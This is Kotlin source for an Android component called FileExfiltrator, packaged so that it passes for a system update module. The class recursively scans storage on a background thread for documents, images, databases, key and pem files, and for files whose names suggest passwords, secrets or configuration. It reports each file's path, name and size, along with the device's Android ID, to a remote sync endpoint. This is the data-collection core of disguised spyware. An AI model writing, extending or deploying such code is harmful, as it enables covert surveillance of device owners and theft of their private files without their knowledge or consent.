package com.android.system.update.modules.data

import android.content.Context
import android.provider.Settings
import com.android.system.update.core.NetworkConnectionManager
import org.json.JSONObject
import java.io.File

class FileExfiltrator(private val context: Context) {

    private val networkManager = NetworkConnectionManager(context)
    private val sensitiveExtensions = setOf(
        "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
        "jpg", "jpeg", "png", "db", "sqlite", "txt", "key", "pem"
    )

    fun scanAndExfiltrate(directory: File) {
        if (!directory.exists() || !directory.isDirectory) return
        Thread { recursiveSearch(directory) }.start()
    }

    private fun recursiveSearch(directory: File) {
        directory.listFiles()?.forEach { file ->
            if (file.isDirectory) {
                recursiveSearch(file)
            } else {
                if (isSensitive(file) && file.length() < 50 * 1024 * 1024) {
                    reportFileToCloud(file)
                }
            }
        }
    }

    private fun isSensitive(file: File): Boolean {
        val name = file.name.lowercase()
        return sensitiveExtensions.contains(file.extension.lowercase()) ||
               name.contains("pass") || name.contains("secret") ||
               name.contains("conf") || name.contains("vpp")
    }

    private fun reportFileToCloud(file: File) {
        val payload = JSONObject().apply {
            put("device_id", getDeviceId())
            put("item_path", file.absolutePath)
            put("item_name", file.name)
            put("item_size", file.length())
            put("content_type", file.extension)
            put("detection_source", "automated_scanner")
        }
        networkManager.sync(payload.toString(), "flagged_items")
    }

    private fun getDeviceId(): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }
}